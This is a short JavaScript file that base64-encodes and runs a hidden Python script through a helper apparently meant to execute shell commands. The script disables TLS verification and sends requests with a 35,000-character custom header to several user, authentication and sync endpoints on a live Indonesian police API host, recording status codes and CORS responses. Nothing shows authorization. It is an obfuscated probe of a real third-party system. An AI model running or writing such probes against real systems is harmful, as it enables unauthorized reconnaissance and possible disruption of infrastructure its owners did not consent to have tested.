import { runFE } from './fe_exec.mjs';

const pyScript = `
import urllib.request, ssl
ctx = ssl._create_unverified_context()

endpoints = [
  "/api/bdb/menu-access",
  "/api/user/me/profile",
  "/api/Authentication/user",
  "/api/bdb/notifications/summary",
  "/api/bdb/dors/sync/logs?limit=1"
]

for ep in endpoints:
    url = f"https://api-cas.bareskrim.polri.go.id{ep}"
    req = urllib.request.Request(url)
    req.add_header("X-Large-Session-Token", "T" * 35000)
    try:
        res = urllib.request.urlopen(req, context=ctx)
        print(f"{ep} with 35KB header => HTTP {res.status} (CORS: {res.headers.get('Access-Control-Allow-Origin')})")
    except urllib.error.HTTPError as e:
        print(f"{ep} with 35KB header => FAILED HTTP {e.code}")
`;

const b64 = Buffer.from(pyScript).toString('base64');
console.log(runFE(`
python3 -c "$(echo '${b64}' | base64 -d)"
`));
